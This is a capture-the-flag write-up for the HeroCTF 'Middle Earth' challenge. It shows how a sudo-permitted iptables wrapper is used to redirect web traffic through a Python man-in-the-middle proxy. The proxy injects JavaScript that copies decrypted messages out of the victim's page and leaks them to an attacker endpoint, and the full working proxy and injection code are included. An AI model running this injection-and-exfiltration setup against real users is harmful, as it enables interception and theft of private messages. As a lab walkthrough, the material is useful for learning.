HeroCTF – Middle Earth (Web / Crypto / System) Writeup

Category: Web / Crypto / System
Difficulty: Medium
Flag: Hero{why_n0_http5_?_dbf81c4c9f3cb1b0ae72ad23c019fdce}

1. Challenge Overview

We’re given:

A web app:
http://dyn03.heroctf.fr:13892

SSH access:
ssh -p 11657 aragorn@dyn03.heroctf.fr (password: hobbit)

Flavour text about “end-to-end encryption” and asymmetric crypto.

Note that Saruman is using the app as admin.

Goal: break the “secure” mail system and recover the flag in the format Hero{...}.

2. First Look at the Web App

Browsing to http://dyn03.heroctf.fr:13892 and logging in with aragorn:hobbit shows a very simple inbox:

A Session Encryption Key (an RSA public key) shown in PEM format.

A button to Request Encrypted Message.

A UI showing:

New Encrypted Message
From: server@secure.mail

<ciphertext in base64>

[Decrypt]


When we click “Decrypt”, the ciphertext is decrypted client-side and replaced with a plaintext quote, e.g.:

Only put off until tomorrow what you are willing to die having left undone. ~Pablo Picasso

Key observations:

The app is over HTTP, not HTTPS.

The cryptography (key generation, encryption, decryption) is all done in JavaScript in the browser.

The server only sees:

A session public key, and

Encrypted messages for that key.

The challenge text screams: “Bilbo thinks this is end-to-end encryption, but we have server access.”

So instead of attacking RSA directly, the actual vulnerability is architectural:

If the server can modify the JavaScript, it can break any “end-to-end” encryption implemented in that JavaScript.

3. Getting System Access as aragorn

We SSH into the box:

ssh -p 11657 aragorn@dyn03.heroctf.fr
# password: hobbit


Basic recon:

whoami        # aragorn
hostname      # middle_earth
ls /
ls /var
ls /opt
ls /home


We see a few interesting things:

/challenge exists but is not accessible: cd /challenge → Permission denied.

/opt contains a script:

cd /opt
ls -l
# -rwxrwxr-x 1 root root 2426 Nov 27 11:03 w_iptables.sh


Next, check our sudo rights:

sudo -l


Output (relevant part):

User aragorn may run the following commands on middle_earth:
    (root) /opt/w_iptables.sh


So we can’t run arbitrary root commands, but we can run /opt/w_iptables.sh as root.

4. Understanding /opt/w_iptables.sh

Let’s read it:

cd /opt
sed -n '1,160p' w_iptables.sh


Content (summarised):

#!/bin/bash

APPEND_OR_DELETE=$1
CHAIN=$2
PROTOCOL=$3
PORT_SRC=$4
PORT_DST=$5
ACTION=$6

ALLOWED_APPEND_OR_DELETE=("A" "D")
ALLOWED_CHAINS=("INPUT" "OUTPUT" "FORWARD" "PREROUTING" "POSTROUTING")
ALLOWED_PROTOCOLS=("tcp" "udp")
ALLOWED_ACTIONS=("ACCEPT" "DROP" "REJECT" "MASQUERADE" "REDIRECT")

# validates args...

if [[ "$ACTION" == "REDIRECT" ]]; then
    /usr/sbin/iptables -t nat -$APPEND_OR_DELETE "$CHAIN" -p "$PROTOCOL" --dport "$PORT_SRC" -j "$ACTION" --to-ports "$PORT_DST"
elif [[ "$ACTION" == "MASQUERADE" ]]; then
    /usr/sbin/iptables -t nat -$APPEND_OR_DELETE "$CHAIN" -j "$ACTION"
else
    /usr/sbin/iptables -$APPEND_OR_DELETE "$CHAIN" -p "$PROTOCOL" --dport "$PORT_SRC" -j "$ACTION"
fi


Key point: we have a controlled sudo that allows us to add/remove iptables rules, including NAT REDIRECT in the nat table, but only for ports 1–2000.

That’s enough to do a root-enabled network MITM.

5. Strategy: MITM + JS Injection

We can’t edit /challenge as aragorn, so we can’t directly modify templates or server code.

But we can:

Run a small Python HTTP proxy (MITM) on a port we control, say 1337 (allowed by iptables wrapper).

Use w_iptables.sh with REDIRECT to send all traffic destined to the real HTTP backend through our proxy.

In the proxy, inject a <script> tag into HTML responses that:

Watches the DOM.

When decrypted message text appears, it exfiltrates it back to the server via a simple request (e.g. /leak?d=...).

The proxy logs the value of d → we see whatever plaintext the user’s browser decrypted.

Since Saruman’s admin message presumably contains the flag, once his browser (or bot) decrypts it, we will see Hero{...} in our MITM output.

6. Building the Python MITM Proxy

On the box, we create /tmp/mitm.py:

cat << 'EOF' > /tmp/mitm.py
import http.server, socketserver, http.client, urllib.parse, sys

BACKEND_HOST = "127.0.0.1"
BACKEND_PORT = 80          # internal backend (assumed)
LISTEN_PORT  = 1337        # our MITM

INJECT_JS = '<script>(function(){function leak(t){if(!t)return;t=t.trim();if(!t)return;try{var i=new Image();i.src="/leak?d="+encodeURIComponent(t);}catch(e){}}var o=new MutationObserver(function(ms){ms.forEach(function(m){m.addedNodes.forEach(function(n){try{if(n.nodeType===Node.TEXT_NODE){leak(n.nodeValue);}else if(n.textContent){leak(n.textContent);}}catch(e){}});});});function s(){if(!document.body)return;o.observe(document.body,{childList:true,subtree:true});}if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",s);}else{s();}})();</script>'

class Proxy(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        sys.stderr.write("%s - - [%s] %s\n" %
                         (self.client_address[0],
                          self.log_date_time_string(),
                          fmt%args))

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        # Exfil endpoint: /leak?d=...
        if parsed.path == "/leak":
            qs = urllib.parse.parse_qs(parsed.query)
            data = qs.get("d", [""])[0]
            if data:
                print("[LEAK]", data)
                sys.stdout.flush()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")
            return
        self._proxy()

    def do_POST(self):
        self._proxy()

    def _proxy(self):
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length) if length > 0 else None

        conn = http.client.HTTPConnection(BACKEND_HOST, BACKEND_PORT, timeout=10)
        headers = {k: v for k, v in self.headers.items()}

        try:
            conn.request(self.command, self.path, body=body, headers=headers)
            res = conn.getresponse()
        except Exception as e:
            self.send_error(502, "Upstream error: %s" % e)
            return

        resp_body = res.read()
        status = res.status
        reason = res.reason
        resp_headers = res.getheaders()

        content_type = ""
        for k, v in resp_headers:
            if k.lower() == "content-type":
                content_type = v
                break

        # Inject our JS into HTML bodies
        if "text/html" in content_type and b"</body>" in resp_body:
            inject_bytes = INJECT_JS.encode()
            new_body = resp_body.replace(b"</body>", inject_bytes + b"</body>", 1)
            diff = len(new_body) - len(resp_body)
            resp_body = new_body
            new_headers = []
            for k, v in resp_headers:
                if k.lower() == "content-length":
                    try:
                        v = str(int(v) + diff)
                    except ValueError:
                        v = str(len(resp_body))
                new_headers.append((k, v))
            resp_headers = new_headers

        self.send_response(status, reason)
        for k, v in resp_headers:
            if k.lower() in ("connection", "keep-alive", "proxy-authenticate",
                             "proxy-authorization", "te", "trailers",
                             "transfer-encoding", "upgrade"):
                continue
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(resp_body)

def main():
    with socketserver.ThreadingTCPServer(("", LISTEN_PORT), Proxy) as httpd:
        print("[*] MITM listening on port", LISTEN_PORT)
        print("[*] Proxying to %s:%d" % (BACKEND_HOST, BACKEND_PORT))
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\\n[!] Stopping MITM")

if __name__ == "__main__":
    main()
EOF


This does:

Listens on 0.0.0.0:1337.

Forwards requests to 127.0.0.1:80.

For responses with Content-Type: text/html and a </body>, injects our <script>.

Handles /leak?d=... locally and prints [LEAK] <data> to stdout.

7. Redirecting HTTP Traffic via the Sudo Wrapper

Now we use w_iptables.sh to redirect incoming HTTP destined to port 80 to our proxy 1337.

sudo /opt/w_iptables.sh A PREROUTING tcp 80 1337 REDIRECT


This runs as root and effectively does:

iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 1337


Given the external port is 13892, the infrastructure likely DNATs 13892 → 80 on the container/VM.
We’re just inserting ourselves into that flow.

8. Running the MITM and Testing

Start the MITM:

python3 /tmp/mitm.py


It prints:

[*] MITM listening on port 1337
[*] Proxying to 127.0.0.1:80


From our local machine:

Go to http://dyn03.heroctf.fr:13892.

Log in as aragorn:hobbit.

Click Request Encrypted Message.

Click Decrypt.

On the server, in the mitm.py output, we see something like:

10.99.xx.xx - - [date] "POST /request_encrypted HTTP/1.1" 200 -
[LEAK] New Encrypted Message
                        From: server@secure.mail
                    
                    Decrypt
                    
                
                cL8vUcV...
[LEAK] Decrypted
[LEAK] When you stop chasing the wrong things you give the right things a chance to catch you. ~Lolly Daskal


That proves:

Our injected JS runs in the victim’s browser.

It sees the decrypted plaintext in the DOM.

It hits /leak?d=..., and the MITM logs it.

Exactly what we need for Saruman.

9. Catching the Admin’s Flag

After some time (or manual actions from the admin/bot), we see another decrypted message in the MITM output:

[LEAK] Hero{why_n0_http5_?_dbf81c4c9f3cb1b0ae72ad23c019fdce}


This is clearly in flag format, so:

Flag:
Hero{why_n0_http5_?_dbf81c4c9f3cb1b0ae72ad23c019fdce}